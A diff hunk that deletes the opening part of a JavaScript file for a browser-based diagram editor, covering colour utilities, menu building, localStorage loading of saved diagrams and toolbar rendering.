@@ -1,11753 +1,1 @@
-
-if (document.location.toString().indexOf("localhost") >= 0
-        && typeof (handleErr) == 'undefined')
-{
-    function handleErr(msg, url, l)
-    {
-        var txt = "There was an error on this page.\n\n"
-                + "Error: " + msg + "\n"
-                + "URL:   " + url + "\n"
-                + "Line:  " + l;
-
-
-        // window.onerror = handleErr;
-        return true;
-    }
-    window.onerror = handleErr;
-}
-if (typeof (expiretime) == 'undefined')
-{
-    var expiretime = (new Date()).getTime() + 3600000;
-    var activeidletime = 3600000;
-}
-var allis = [];
-//shapearr[i]=[words,shapename,x,y,width,height,fontsize,color]
-//linearr[i]=[type,startobjnum,xonobj, yonobj, endobjnum, xonobj,yonobj,thick,direction]
-var shapes = ["rightrect", "roundrect", "ellipse", "diamond"];
-var arrows = ["arrow", "arrom", "diamond", "line"];
-//var COLORS = ["black", "red", "green", "orange", "blue", "purple", "pink", "#00BBBB"];
-//var BCOLORS = ["white", "red", "green", "orange", "blue", "purple", "pink","lightyellow","transparent",'1'];
-if (typeof (kframes) == 'undefined')
-{
-    var kframes = new Object();// kframes['5_4'] = {esn:1, ets:[[1,2]], etm:5, ssn:1, sts:[[1,2]], stm:5, loop:3, lsn:1, lts:[[1,2]], ltm:5};
-    var kshapes = [];
-}
-if (typeof (colors) == 'undefined')
-{
-    var colors = ["black", "red", "green", "orange", "blue", "purple", "pink", "#BBBB00"];
-}
-if (typeof (bcolors) == 'undefined')
-{
-    var bcolors = ["white", "red", "green", "orange", "blue", "purple", "pink", "lightyellow", "transparent", '1'];
-} 
-else
-{
-    bcolors[8] = 'transparent';
-    bcolors[9] = '1';
-}
-var iconx, icony;
-var handle = null;
-var allfonts = [15, 20, 25, 30, 35, 40, 45, 50];
-var fillblank = "<!---->";
-var diamondchar = "&loz;";
-var horarrowchar = "&rarr;";
-var uparrowchar = "&uarr;";
-var bullchar = "&bull;";
-var diamschar = "&diams;";
-var linetype = '';
-var state = 0;
-var numShapes = 0;
-var allShapes = new Array();
-var savestart = 0;
-var savestartx = 0;
-var savestarty = 0;
-var numLines = 0;
-var allLines = new Array();
-var currentlnum = 0;
-var myHintx = 0;
-var myHinty = 0;
-var cord;
-var folder = null;
-var locationstr = '';
-var whichact = '';
-var textareatobesearch = null;
-var playstate = 'playstop';
-var menufontcolor = 0;
-var numbeing = 0;
-var activesave = false;
-var pagetbl = null;
-var hasone = null;
-var numsselected = [];
-var cdbeing = -1;
-var tdaredoing;
-var numaredoing = [];
-var itemaredoing;
-var bgcolorcode = -1;
-var fromserver = true;
-if (typeof (originalurl) == 'undefined')
-{
-    var originalurl = '';
-    var filename = null;
-}
-if (typeof (shapearr) == 'undefined')
-{
-    fromserver = true;
-    var shapearr = new Array();
-    var linearr = new Array();
-    var curvearr = new Array();
-    var attachstr = '';
-    var shapetime = new Array();
-    var linetime = new Array();
-    var curvetime = new Array();
-    var pagetime = new Array();
-}
-if (typeof (bgarr) == 'undefined')
-    var bgarr = new Array();
-if (typeof (attachstr) == 'undefined')
-    var attachstr = '';
-if (typeof (attacharr) != 'undefined')
-{
-    for (var i1 = 0; i1 < attacharr.length; i1++)
-        if (attacharr[i1] != null && attacharr[i1] != '')
-            attachstr += attacharr[i1];
-}
-if (typeof (editable) == 'undefined')
-{
-    var editable = true;
-}
-if (typeof (tstmp) == 'undefined')
-{
-    var tstmp = (new Date()).getTime() % 10000000;
-}
-
-var iframename = "w" + tstmp;
-
-var seldirect = 0;
-var onmouseover0 = null;
-var pagenum = 0;
-var favorx = 5;
-var mfavory = 0;
-var favory = 50;
-var favorw = 400;
-var favorh = 200;
-var deletepage = 0;
-var beingloadnum;
-var selectend;
-var selectstart = 0;
-var entered = new Array();
-var otherunique = null;
-
-var ppos = 0;
-var tobeparsed = '';
-var tempsstr;
-var templstr;
-var tempcstr;
-var tempastr;
-var tempbstr;
-var pgn = 0;
-var hassaved = true;
-var tnamebeing = '';
-var toolbarxy = 0;
-var sentline = false;
-var drawstate = 0;
-var drawpoints = null;
-var drawpointslength = 0;
-var numCurves = 0;
-var allCurves = new Array();
-var searches = document.location.search.replace(/^\?/, '').split(/&/);
-var dobackground = false;
-var minutes = "";
-var sessionid = null;
-var toolnames = "";
-var cachedshapenum;
-var cachedshapename = "rightrect";
-var cachedlinecolor = 0;
-var cachedcurvecolor = 0;
-var cachedianum = 0;
-var cachedcd = 0;
-var cachedfc = 0;
-var ismakingtab = 1;
-var savedfontrate = 1;
-var hintstr = textmsg[1836].split(/@/);
-if (typeof (cachedfontfamily) == 'undefined')
-    var cachedfontfamily = textmsg[1594].replace(/@.*/, '');
-var haspagesort = false;
-var imagelet2wh = [];
-var base2cn = [];
-if (typeof (myfontname) != 'undefined')
-    cachedfontfamily = myfontname;
-if (typeof (onlinetoolinitial) == 'undefined' || onlinetoolinitial == null)
-{
-    onlinetoolinitial = ";LaTex;web;LaTex toolbar;LaTex;" + originalurl + "/findrep.js;showlatexpanel(content_a,this);";
-}
-if (folder != null)
-onlinetoolinitial += textmsg[16] + ";web;Configuration;Configure;;openconfigtool();";
-var onlinetoolinfo = onlinetoolinitial;
-if (typeof (allies) == 'undefined')
-    var allies = [];
-var filenamestr = null;// localStorage['filenames'];
-
-function samefont(x, y)
-{
-    if (x == null || y == null)
-        return false;
-    y = y.toLowerCase();
-    var ans = false;
-    var xs = x.toLowerCase().split(/[ ]*,[ ]*/);
-    for (var i = 0; i < xs.length; i++)
-        if (y.indexOf(xs[i]) >= 0)
-        {
-            ans = true;
-            break;
-        }
-
-    return ans;
-}
-var oldonlinetoolcp = onlinetoolcp;
-onlinetoolcp = function (button, aname)
-{
-    button.form.target = "_blank";
-    oldonlinetoolcp(button, aname);
-}
-var objentering = -1;
-
-function openconfigtool()
-{
-    onlinetoolinfo = onlinetoolinfo.replace(/^;/, '');
-    var xs = onlinetoolinfo.split(/;/);
-    var s = '@';
-
-    for (var i = 0; i < xs.length; i++)
-        if (i % 6 == 3)
-            s += xs[i] + '@';
-    myprompt('<iframe src="remote.jsp?schedule=' + s + '" width=700 height=600 />', null, null, textmsg[16] + textmsg[1776]);
-
-}
-function setTool(n, y)
-{
-    var j;
-    if (y.charAt(0) == ';')
-        y = y.substring(1);
-    if ((j = onlinetoolinfo.indexOf(y)) >= 0)
-    {
-
-        onlinetoolinfo = onlinetoolinfo.substring(0, j) + onlinetoolinfo.substring(j + y.length);
-
-    } else
-    {
-        onlinetoolinfo += y;
-
-    }
-    if (onlinetoolinfo.charAt(0) != ';')
-        onlinetoolinfo = ';' + onlinetoolinfo;
-
-    onlinetoolinitial = onlinetoolinfo;
-    var ss = onlinetoolstr(onlinetoolinfo);
-
-    onlinetoolbase.innerHTML = ss;
-}
-
-if (typeof (passedencoding) == 'undefined')
-{
-    var passedencoding = '';
-    var passedfilename = '';
-    var passedsessionid = '';
-    for (var j2 = 0; j2 < searches.length; j2++)
-        if (searches[j2].indexOf('fn=') == 0)
-            passedfilename = searches[j2].substring(3);
-        else if (searches[j2].indexOf('en=') == 0)
-            passedencoding = searches[j2].substring(3);
-        else if (searches[j2].indexOf('sn=') == 0)
-            passedsessionid = searches[j2].substring(3);
-    document.title = passedfilename;
-}
-
-var chatsessionnum = (passedsessionid == null || passedsessionid == '' || isNaN(passedsessionid)) ? -1 : parseInt(passedsessionid);
-
-if ($('mainmeta') && passedencoding != '')
-{
-    $('mainmeta').content = 'text/html; charset=' + passedencoding;
-}
-function tohex(s)
-{
-    var i = parseInt(s);
-    var y = Number(i).toString(16);
-    if (y.length == 1)
-        y = '0' + y;
-    return y.toLowerCase();
-}
-function hexcolor(cl)
-{
-    if (cl == null || cl == '' || cl.toLowerCase() == 'transparent')
-        return 'transparent';
-    else if (!isNaN(cl))
-        return cl;
-    if ((cl + '').toLowerCase().indexOf('rgb') >= 0)
-    {
-        var x = ('' + cl).replace(/rgb/, '').replace(/\(/, '').replace(/\)/, '').split(/,/);
-        return  '#' + tohex(x[0]) + tohex(x[1]) + tohex(x[2]);
-    }
-    cl = cl.toUpperCase();
-    if (cl == "WHITE")
-        cl = "#FFFFFF";
-    else if (cl == "SILVER")
-        cl = "#C0C0C0";
-    else if (cl == "GRAY")
-        cl = "#808080";
-    else if (cl == "BLACK")
-        cl = "#000000";
-    else if (cl == "RED")
-        cl = "#FF0000";
-    else if (cl == "MAROON")
-        cl = "#800000";
-    else if (cl == "YELLOW")
-        cl = "#FFFF00";
-    else if (cl == "OLIVE")
-        cl = "#808000";
-    else if (cl == "LIME")
-        cl = "#00FF00";
-    else if (cl == "GREEN")
-        cl = "#008000";
-    else if (cl == "AQUA")
-        cl = "#00FFFF";
-    else if (cl == "TEAL")
-        cl = "#008080";
-    else if (cl == "BLUE")
-        cl = "#0000FF";
-    else if (cl == "NAVY")
-        cl = "#000080";
-    else if (cl == "FUCHSIA")
-        cl = "#FF00FF";
-    else if (cl == "PURPLE")
-        cl = "#800080";
-    else if (cl == 'PINK')
-        cl = '#FFC0CB';
-    else if (cl == 'ORANGE')
-        cl = '#FFA500';
-    else if (cl == 'CYAN')
-        cl = '#00FFFF';
-    if (cl.replace(/#[0-9|a-z][0-9|a-z][0-9|a-z][0-9|a-z][0-9|a-z][0-9|a-z]/i, '') != '')
-        return 'transparent';
-    return cl.toLowerCase();
-}
-function samecolor(x, y)
-{
-    return hexcolor(x) == hexcolor(y);
-}
-
-function gradient(cl, sn)
-{
-    cl = hexcolor(cl);
-    if (cl == 'transparent')
-        return "url()";
-    var r = parseInt(cl.substring(1, 3), 16);
-    var g = parseInt(cl.substring(3, 5), 16);
-    var b = parseInt(cl.substring(5), 16);
-    var c0;
-    if (sn == 'egg' || sn == 'ellipse' || sn == 'circle')
-    {
-        r += 60;
-        if (r > 255)
-            r = 255;
-        g += 50;
-        if (g > 255)
-            g = 255;
-        b += 60;
-        if (b > 255)
-            b = 255;
-        c0 = "rgb(" + r + "," + g + "," + b + ")";
-    } else
-    {
-        if (r == 0)
-            r = Math.round(Math.random() * 50);
-        else {
-            r -= Math.round(Math.random() * 0.34 * r);
-            if (r < 0)
-                r = 0;
-        }
-        var rs = Number(r).toString(16);
-        if (r < 16)
-            rs = '0' + rs;
-        if (g == 0)
-            g = Math.round(Math.random() * 50);
-        else {
-            g -= Math.round(Math.random() * 0.34 * g);
-            if (g < 0)
-                g = 0;
-        }
-        var gs = Number(g).toString(16);
-        if (g < 16)
-            gs = '0' + gs;
-        if (b == 0)
-            b = Math.round(Math.random() * 50);
-        else {
-            b -= Math.round(Math.random() * 0.30 * b);
-            if (b < 0)
-                b = 0;
-        }
-        var bs = Number(b).toString(16);
-        if (b < 16)
-            bs = '0' + bs;
-        c0 = "#" + rs + gs + bs;
-    }
-
-    if (sn == 'egg' || sn == 'ellipse' || sn == 'circle')
-        c0 = 'radial-gradient(closest-side at 40% 35%,' + c0 + ",   " + cl + ")";
-    else
-        c0 = 'linear-gradient(' + c0 + " 10%," + cl + ")";
-
-    return c0;
-}
-function findPositionnoScrolling(oElement, win)
-{
-    if (win == null)
-        win = self;
-    if (oElement == null)
-        return [0, 0];
-    if (typeof (oElement.offsetParent) != 'undefined')
-    {
-        var ii = 0;
-        var originalElement = oElement;
-        for (var posY = 0, posX = 0; ii++<10 && oElement!=null; oElement = oElement.offsetParent )
-        {
-            posY += oElement.offsetTop;
-            posX += oElement.offsetLeft;
-            if (oElement != originalElement && oElement != win.document.body && oElement != win.document.documentElement)
-            {
-                posY -= oElement.scrollTop;
-                posX -= oElement.scrollLeft;
-            }
-        }
-        return  [posX, posY];
-    }
-    else
-    {
-        return  [oElement.x, oElement.y];
-    }
-}
-function padd2(i)
-{
-    if (i > 9)
-        return i;
-    else
-        return '0' + i;
-}
-function initfilename()
-{
-    locationstr = document.location.toString();
-    var lj = locationstr.lastIndexOf("/");
-    if (lj > 0)
-    {
-        var filenm = locationstr.substring(lj + 1);
-        locationstr = locationstr.substring(0, lj);
-        if (locationstr.indexOf("http") == 0 && filenm.indexOf("umltool.html") == 0)
-        {
-            originalurl = locationstr;
-            filename = passedfilename;
-        }
-    }
-
-    if ( (filename == null || filename == '') &&  passedfilename!= 'erd.html')
-    {
-        var d = new Date();
-        filename = padd2(d.getYear() % 100) + padd2(d.getMonth()) + padd2(d.getDate()) + ".html";
-    }
-
-    if (window.opener!= null
-    && typeof(window.self)!='undefined'
-    && window.opener!= window.self
-    && window.opener!=null
-    &&  (onmydomain(opener))
-    && typeof(window.opener.getFolder)!='undefined'
-    )
-    {
-        folder = window.opener.getFolder();
-        subdb = window.opener.getSubdb();
-    }
-    else if (parent!=self && parent.frames[0]!=self && typeof(parent.frames[0].getFolder)!='undefined')
-    {
-        folder = parent.frames[0].getFolder();
-        subdb = parent.frames[0].getSubdb();
-    }
-    else if (parent!=self && parent.frames[0]!=self && typeof(parent.fntobesaved)!='undefined')
-    {
-        folder = "communication/chat";
-        filename = parent.fntobesaved();
-    }
-    else
-    {
-        var str = localStorage[filename];
-         
-        if (str!=null)
-        {
-            var obj = JSON.parse(str);
-            orgnum = obj.orgnum;
-            originalurl = obj.originalurl;
-            if (typeof(umltoolstyles)!= 'undefined')
-            {
-            umltoolstyles.id = obj.umltoolstylesid;
-            umltoolstyles.href = obj.umltoolstyleshref;
-            }
-            cachedfontfamily = obj.cachedfontfamily;
-            colors = obj.colors;
-            bcolors = obj.bcolors;
-            filename = obj.filename;
-            needtranslator = obj.needtranslator;
-            editable = obj.editable;
-            tstmp = obj.tstmp;
-            shapearr = obj.shapearr;
-            
-            linearr = obj.linearr;
-            curvearr = obj.curvearr;
-            attachstr = obj.attachstr;
-            shapetime = obj.shapetime;
-            linetime = obj.linetime;
-            curvetime = obj.curvetime;
-             pagetime = obj.pagetime;
-             allies = obj.allies;
-             bgarr = obj.bgarr;
-            kframes = obj.kframes;
-            kshapes = obj.kshapes;
-        }
-    }
-}
-var subdb = null;
-function rcolor(x)
-{
-    var i=0;
-    for (; i < colors.length; i++)
-        if (colors[i] == x) return i;
-    return 0;
-}
-function rbcolor(x)
-{
-    var i=0;
-    for (; i < bcolors.length; i++)
-        if (bcolors[i] == x) return i;
-    return bcolors.length-1;
-}
-function setcolor()
-{
-
-}
-function insideobj()
-{
-   for (var i=0; i < numShapes; i++)
-       if (allShapes[i]!=null && allShapes[i].inbase(myHintx,myHinty)) return true;
-   var m = $('m0_0');
-   if (m==null) return false;
-   var x = parseInt(m.style.left.replace(/px/,'')) - myHintx;
-   var y = parseInt(m.style.top.replace(/px/,'')) - myHinty;
-   var w = m.offsetWidth;
-   var h = m.offsetHeight;
-   return (x>=0 && x <=w && y>=0 && y <= h);
-}
-
-function saveable()
-{
-    return (opener!=null && (onmydomain(opener))  && typeof(opener.helpsave) != 'undefined');
-}
-function setfolderfn(fd, fn)
-{
-    folder = fd;
-    filename = fn;
-}
-function savesqlable()
-{
-    return (parent!=self && typeof(parent.frames[0].savedef) != 'undefined');
-}
-function shrink(shapename)
-{
-   if (shapename== 'roundrect') return 0.85;
-   if (shapename== 'ellipse') return  0.63;
-   if (shapename== 'diamond') return  0.43;
-   return 0.9;
-}
-function picname(s,d)
-{
-    if (s== "line")
-       return  "-";
-    else if (s== 'diamond' )
-        return  diamondchar;
-    else if (s== 'arrom')
-        return 'm';
-    else if (d== 0)
-        return horarrowchar ;
-    return '>' ;
-}
-
-function filecontent()
-{
-
-   sourcecodes();
-   //canceldia(0,0);
-}
-function clr()
-{
-    clearall1(1);
-}
-
-var high = 20;
-function shrinkht(tdid)
-{
-    $(tdid).style.visibility =  "hidden";
-}
-function changepagelbl(td)
-{
-    var tbl = td.parentNode.parentNode.parentNode;
-    for (var j=1; j < tbl.rows.length; j++)
-    {
-        var ctd = tbl.rows[j].cells[0];
-        if (td == ctd) ctd.style.backgroundColor = 'grey';
-        else ctd.style.backgroundColor = 'white';
-    }
-    tbl.rows[0].cells[0].innerHTML = td.innerHTML;
-    tbl.rows[0].cells[0].style.backgroundColor = 'transparent';
-}
-function makemenu2()
-{
-   popmenu('selplay',$('tdplay'));
-   if (editable)popmenu('selfile',$('tdfile'));
-   popmenu('selpage',$('tdpage'));
-   
-}
-function popmenu(id,td)
-{
-    if (filenamestr == null) 
-    {
-        var farr = [];
-       
-        for (var fn in localStorage)
-        {
-            if (fn.indexOf(".html")>0 )
-            farr[farr.length] = fn;
-        }
-        filenamestr = JSON.stringify(farr);
-    }
-    var dv = $(id);
-    var xy = findPositionnoScrolling(td); 
-    if (dv != null)
-    {
-        if (closemenuhandle[id] != null)
-            clearTimeout(closemenuhandle[id]);
-        closemenuhandle[id] = null;
-        
-        if (id == 'selpage') 
-        {
-            pagetbl.rows[0].cells[0].innerHTML = textmsg[1854].replace(/@/, '1');
-            pagetbl.style.backgroundColor = 'transparent';
-            $('selplay').style.visibility = 'hidden';
-            if(editable)$('selfile').style.visibility = 'hidden';
-        }
-        else if (id=='selplay')
-        {
-            Play.color(Play.state);
-            $('selpage').style.visibility = 'hidden';
-            if(editable)$('selfile').style.visibility = 'hidden';
-        }
-        else
-        {
-            $('selplay').style.visibility = 'hidden';
-            $('selpage').style.visibility = 'hidden';
-        }
-        dv.style.visibility = 'visible';
-        td.style.textDecoration = 'none';
-        dv.style.left = xy[0] + 'px';
-        $(id).style.color =  colors[menufontcolor];
-        return;
-    }
-    
-    var palylabels = textmsg[1771].split(/@/);
-    dv = document.createElement('div');
-    dv.id = id;
-    
-    xy[1] += 2; if (id=='selpage') xy[0] -= 4;
-    dv.style.cssText = "background-image:linear-gradient(#eff,#cdd);visibility:hidden;background-color:white;box-shadow:#bbb 1px 1px;padding:5px 4px 4px 4px;vertical-align:middle;position:absolute;left:" + xy[0] + "px;top:" + (xy[1] + high) + "px;z-index:300;color:" + colors[menufontcolor]  ;
-    var str = "<table style=margin:0px;font-weight:400px;color:inherit cellpadding=0 cellspacing=0>";
-    //<div onmouseover=\"exitsort();$('selplay').style.height=null;\"  id=\"selplay\" style=\"vertical-align:middle;line-height:" + high + "px;display:inline-block;overflow:hidden\" >
-    if (id == 'selplay')
-    {
-        str += ("<tr height=" + (high) + "><td align=left class=flipcolor valign=middle  style=font-weight:400 onclick=\"Play.schedule();shrinkht('selplay');\"  id=\"timebtn\"   title=\"" + hintstr[2] + "\" >" + textmsg[36] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.start();shrinkht('selplay');\"  >" + palylabels[0] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.pause();shrinkht('selplay');\" >" + palylabels[1] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.resume();shrinkht('selplay');\" >" + palylabels[2] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.forward();shrinkht('selplay');\" >" + palylabels[3] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.backward();shrinkht('selplay');\">" + palylabels[4] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.stop();shrinkht('selplay');\">" + palylabels[5] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"Play.remote();shrinkht('selplay');\"  title=\"" + hintstr[3] + "\" >" + palylabels[6] + "</td></tr>");
-        str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   style=font-weight:400 onclick=\"makepagetab1();shrinkht('selplay');\"  title=\"" + hintstr[1] + "\" >" + palylabels[8] + "</td></tr>");
-        if (editable)
-            str += ("<tr height=" + (high) + "><td  class=flipcolor align=left  valign=middle   onclick=\"makepagesort();shrinkht('selplay');\"  style=font-weight:400  title=\"" + hintstr[4] + "\" >" + palylabels[13] + "</td></tr>");
-    } else if (id == 'selfile')
-    {
-        if (filename != null)
-        {
-            str += ("<tr height=" + high + "><td  class=flipcolor align=left  valign=middle  style=font-weight:400 onclick=\"saveit();activesave=true;shrinkht('selfile');\" id=\"saveit\">" + textmsg[67] + "</td></tr>");
-        }
-        str += ("<tr height=" + high + "><td   class=flipcolor valign=middle  align=left  style=font-weight:400  onclick=\"saveas();shrinkht('selfile');\" id=\"saveit1\"><nobr>" + textmsg[797] + "</nobr></td></tr>");
-        if (chatsessionnum == -1)
-        {  //uploadfile()
-            str += ("<tr height=" + high + "><td  class=flipcolor valign=middle  style=font-weight:400  align=left onclick=\"uploadfile();shrinkht('selfile');\"  id=\"attachbtn\"  title=\"" + hintstr[5] + "\" >" + textmsg[294] + "</td></tr>");
-        }
-        str += ("<tr height=" + high + "><td  valign=middle  class=flipcolor align=left  style=font-weight:400 onclick=\"filecontent();shrinkht('selfile');\" >" + textmsg[1849].split(/@/)[3] + "</td></tr>");
-        str += ("<tr height=" + high + "><td  class=flipcolor valign=middle  align=left  style=font-weight:400 onclick=\"clr();shrinkht('selfile');\"  id=\"clearbtn\"  title=\"" + hintstr[6] + "\" >" + textmsg[1663] + "</td></tr>");
-        
-            
-        if (filenamestr!=null && filenamestr.replace(filename,'').replace(/[\W]/g,'')!='')
-        str += ("<tr height=" + high + "><td  class=flipcolor valign=middle  align=left  style=font-weight:400 onmouseenter=\"popmenu1('recentfile',this)\"  id=\"recentbtn\"  onmouseout=\"nullmenu('recentfile')\" >Recent</td></tr>");
- 
-    } 
-    else if (id == 'recentfile')
-    {
-        if (filenamestr!=null && filenamestr!='')
-        {
-           let allfs = JSON.parse(filenamestr);
-           for (let ii=0; ii < allfs.length; ii++)
-           {   
-               if (allfs[ii] != filename)
-               str += ("<tr height=" + high + "><td  class=flipcolor valign=middle  align=left  style=font-weight:400 onclick=\"loadthis('" + allfs[ii] + "')\"  id=\"recentfile" + ii + "\"  title=\"" + allfs[ii] + "\" >Recent</td></tr>");
-           } 
-        }
-    }
-    else {
-        for (var i = 0; i < Math.max(1, shapearr.length); i++)
-        {
-            str += ("<tr height=" + high + "><td  class=flipcolor align=left  valign=middle  style=font-weight:400; onclick=\"changepage(this);shrinkht('selpage');\">" + textmsg[1854].replace(/@/, '' + (i + 1)) + "</td></tr>");
-        }
-        if (editable)
-            str += "<tr height=" + high + "><td     class=flipcolor align=left  valign=middle  style=font-weight:400  onclick=\"changepage(this);shrinkht('selpage');\">" + textmsg[114] + "</td</tr>";
-        else 
-            str += "<tr height=1><td  ></td</tr>";
-    }
-    str += "</table>";
-    dv.innerHTML = str;
-    dv.onmouseout = function () {
-      closemenuhandle[this.id] = setTimeout("$('" + this.id + "').style.visibility='hidden';$('" + this.id.replace(/sel/,'td') + "').style.textDecoration='underline';",500); 
-    }
-    dv.onmouseover = function () {
-        if (closemenuhandle[this.id] != null)
-            clearTimeout(closemenuhandle[this.id]);
-        this.style.visibility = 'visible';
-        closemenuhandle[this.id] = null;
-    }
-    document.body.appendChild(dv);
-}
-
-
-var closemenuhandle = [];
-function nullmenu(menu)
-{
-   closemenuhandle[menu] = setTimeout("$('" + menu + "').style.visibility='hidden';$('" + menu.replace(/sel/,'td') + "').style.textDecoration='underline';",500); 
-}
-
-function popmenu1(id,td)
-{
-    var dv = $(id);
-    var xy = findPositionnoScrolling(td); 
-    if (dv != null)
-    {
-        if (closemenuhandle[id] != null)
-            clearTimeout(closemenuhandle[id]);
-        closemenuhandle[id] = null;
-        dv.style.visibility = 'visible';
-        td.style.textDecoration = 'none';
-        dv.style.left = xy[0]  + 'px';
-        $(id).style.color =  colors[menufontcolor];
-        return;
-    }
-    
-    dv = document.createElement('div');
-    dv.id = id;
-    xy[1] += 2; 
-    xy[0] += 230;
-    dv.style.cssText = "background-image:linear-gradient(#eff,#cdd);background-color:white;box-shadow:#bbb 1px 1px;padding:5px 4px 4px 4px;vertical-align:middle;position:absolute;left:73px;top:125px;z-index:300;color:" + colors[menufontcolor]  ;
-    var str = "<table style=margin:0px;font-weight:400px;color:inherit cellpadding=0 cellspacing=0>";
-     
-        if (filenamestr!=null && filenamestr!='')
-        {
-           let allfs = JSON.parse(filenamestr);
-           for (let ii=0; ii < allfs.length; ii++)
-           {   
-               if (allfs[ii] != filename)
-               str += ("<tr height=" + high + "><td  class=flipcolor valign=middle  align=left  style=font-weight:400 onclick=\"loadthis('" + allfs[ii] + "')\"  id=\"recentfile" + ii + "\"  title=\"" + allfs[ii] + "\" >" + allfs[ii] + "</td></tr>");
-           } 
-        }
-    
-    str += "</table>";
-    dv.innerHTML = str;
-    dv.onmouseout = function () {
-      closemenuhandle[this.id] = setTimeout("$('" + this.id + "').style.visibility='hidden';",500); 
-    }
-    dv.onmouseover = function () 
-    {
-        if (closemenuhandle[this.id] != null)
-            clearTimeout(closemenuhandle[this.id]);
-        this.style.visibility = 'visible';
-        closemenuhandle[this.id] = null;
-    }
-    document.body.appendChild(dv);
-}
-function loadthis(filename)
-{
-   document.location.href = document.location.toString().replace(/fn=[^\.]+\.html/,'fn=' + filename);
-}
-function makebtns()
-{
-   var PN = shapearr.length+1;
-   if (shapearr.length==0) PN = 2;
-   if (editable) PN++;
-   var sty1 = document.createElement('style');
-   sty1.id='hovers';
-   sty1.innerHTML =  '.flipcolor{background-color:transparent}'
-                  + '\n.flipcolor:hover{background-color:#cdd}'
-                  + '\n.upto2{border:0px;z-index:0;position:relative;top:0px;height:16px}'
-                  + '\n.upto2:hover{background:#ccc;border:1px grey solid;z-index:200;top:0px;height:32px;margin:0px 0px -16px 0px}'
-                  + '\n.upto3{border:0px;z-index:0;position:relative;top:0px;height:16px}'
-                  + '\n.upto3:hover{background:#ccc;border:1px grey solid;z-index:200;top:0px;height:48px;margin:0px 0px -32px 0px}'
-                  + '\n.aniexapnd{border-radius:0px;border:0px;background:#ccc;border:0px;z-index:0;position:relative;top:0px;width:50px;height:16px;margin:0px 0px 0px 0px}'
-                  + '\n.aniexapnd1{border-radius:4px;border:2px #333 solid;background:linear-gradient(#999,#ddd);z-index:200;top:0px;width:240px;height:108px;margin:-25px -95px -80px -95px}'
-                  + '\n.loopexpand{border-radius:0px;border:0px;background:#ccc;width:40px;border:0px;z-index:0;position:relative;top:0px;height:16px;margin:0px 0px 0px 0px}'
-                  + '\n.loopexapnd1{border-radius:4px;border:1px #666 solid;background:linear-gradient(#999,#ddd);z-index:200;top:0px;height:' + (384) + 'px;width:40px;margin:-184px 0px -184px 0px}'
-                  ;
-   document.getElementsByTagName('head')[0].appendChild(sty1);
-  
-    document.write("<table id=toolbar  cellspacing=0 cellpadding=5 border=0 align=left style=\"z-index:0;margin:0px 0px 0px 0px\" ><tr height=" + (high) + ">");
-    var palylabels = textmsg[1771].split(/@/);
-    if (document.title=='') document.title = palylabels[7];
-    
-    if (editable==false  )
-    {
-        if (chatsessionnum == -1) {
-        document.write("<td    valign=middle  style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\" onmouseover=popmenu('selplay',this) onmouseenter=\"popmenu('selplay',this);exitsort()\" onmouseout=nullmenu('selplay') id=tdplay>" + palylabels[7] + "</td>");
-        }
-        document.write("<td " + (chatsessionnum==-1?'':'width=0') + "   style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"   id=tdpage   onmouseenter=popmenu('selpage',this) onmouseout=nullmenu('selpage')  valign=middle >" + textmsg[1854].replace(/@/,'1') + "</td>");
-        document.write("<td    id=tdcord  style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"  valign=middle align=left onclick=movecord()></td>");
-        document.write("<td width=0><form style=\"margin:0px 0px 0px 0px\" name=\"f\" method=\"post\" action=\"FileOperation\" >"
-                        + "<input name=operation type=hidden value=save>"
-                        + "<input name=filedir size=8 style=\"border:0px;background-color:transparent;\"  type=hidden  value=\"" + filename + "\"  >"
-                        + "<input name=folder  type=hidden  >"
-                        + "<input name=destination type=hidden ><td><input name=attach type=hidden></td></form></td>");
-        document.write("</tr></table>");
-    }
-    else if (editable)
-    {
-        document.write("<td   valign=middle id=tdfile  style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"   onmouseenter=popmenu('selfile',this) onmouseout=nullmenu('selfile') >" + textmsg[1651] + "</td>");
-        if (chatsessionnum == -1) 
-        {
-            document.write("<td    valign=middle  style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\" onmouseover=popmenu('selplay',this) onmouseenter=\"popmenu('selplay',this);exitsort()\" onmouseout=nullmenu('selplay') id=tdplay>" + palylabels[7] + "</td>");
-            document.write("<td " + (chatsessionnum==-1?'':'width=0') + "  style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"   id=tdpage   onmouseenter=popmenu('selpage',this) onmouseout=nullmenu('selpage')  valign=middle >" + textmsg[1854].replace(/@/,''+1) + "</td>");
-        }
-        document.write("<td   id=tdicon   style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"   align=left valign=middle   onclick=\"makeanew(this);hidehint()\"  title=\"" + hintstr[7] + "\"  onmouseout=hidehint()>" + textmsg[1849].split(/@/)[1] + "</td>");
-            
-        if ( chatsessionnum==-1 )
-        {
-             document.write("<td  id=tdclip style=\"text-decoration:underline;background-color:transparent;border-radius:0px;font-weight:400;color:" + colors[menufontcolor] + "\"  align=left onclick=\"ResizeUploaded.attachman(document.f.attach);hidehint()\" title=\"" + hintstr[8] + "\"  onmouseout=hidehint()>" + textmsg[1849].split(/@/)[2] + "</td>");
